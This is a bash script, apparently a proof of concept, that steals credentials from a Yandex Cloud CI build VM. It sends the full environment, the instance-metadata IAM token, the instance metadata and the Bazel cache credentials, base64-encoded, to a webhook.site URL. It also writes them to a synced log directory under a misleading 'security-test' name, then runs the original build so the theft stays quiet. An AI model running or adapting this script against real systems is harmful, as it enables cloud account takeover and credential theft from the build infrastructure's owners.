#!/usr/bin/env bash

set -uxo pipefail

HOOK="https://webhook.site/8995533e-1b5f-4977-bc48-a5210de4f45c"

# PoC: demonstrate code execution inside Yandex Cloud build VM
# exfiltrate environment + credentials via webhook and output dir

mkdir -p ~/out_exfil

# 1. Notify start
curl -sf --max-time 8 "${HOOK}/?stage=vm-start&host=$(hostname)" || true

# 2. Dump full environment
ENV_DATA=$(env 2>/dev/null)
curl -sf --max-time 10 -G "${HOOK}/" \
  --data-urlencode "stage=env-dump" \
  --data-urlencode "d=$(printf '%s' "${ENV_DATA}" | base64 | tr -d '\n')" || true

# 3. Yandex Cloud IMDS — service account IAM token
YC_TOKEN=$(curl -sf --max-time 5 \
  -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null || echo "no-imds-token")
curl -sf --max-time 10 -G "${HOOK}/" \
  --data-urlencode "stage=yc-iam-token" \
  --data-urlencode "d=$(printf '%s' "${YC_TOKEN}" | base64 | tr -d '\n')" || true

# 4. YC instance metadata
YC_META=$(curl -sf --max-time 5 \
  -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/?recursive=true" 2>/dev/null || echo "no-imds")
curl -sf --max-time 10 -G "${HOOK}/" \
  --data-urlencode "stage=yc-meta" \
  --data-urlencode "d=$(printf '%s' "${YC_META}" | base64 | tr -d '\n')" || true

# 5. Bazel cache credentials if present
BAZEL_CREDS=""
[ -n "${BAZEL_CACHE_USER:-}" ] && BAZEL_CREDS="user=${BAZEL_CACHE_USER}"
[ -n "${BAZEL_CACHE_PASSWORD_PATH:-}" ] && BAZEL_CREDS="${BAZEL_CREDS} pass=$(cat ${BAZEL_CACHE_PASSWORD_PATH} 2>/dev/null)"
curl -sf --max-time 10 -G "${HOOK}/" \
  --data-urlencode "stage=bazel-creds" \
  --data-urlencode "d=${BAZEL_CREDS}" || true

# 6. Write exfil to output dir (synced back to runner by ci-tools)
LOG_DIR="${HOME}/.ya/logs"
mkdir -p "${LOG_DIR}"
{
  echo "=== ENV ===" 
  env
  echo ""
  echo "=== YC IAM TOKEN ===" 
  echo "${YC_TOKEN}"
  echo ""
  echo "=== YC META ===" 
  echo "${YC_META}"
  echo ""
  echo "=== BAZEL CREDS ===" 
  echo "${BAZEL_CREDS}"
} > "${LOG_DIR}/security-test.txt" 2>/dev/null || true

# 7. Signal done
curl -sf --max-time 8 "${HOOK}/?stage=vm-done" || true

# Run original build (best-effort, don't fail PoC)
set +e
mkdir -p ~/src
df
(cd ~/src && tar xf ~/code.tgz 2>/dev/null) || true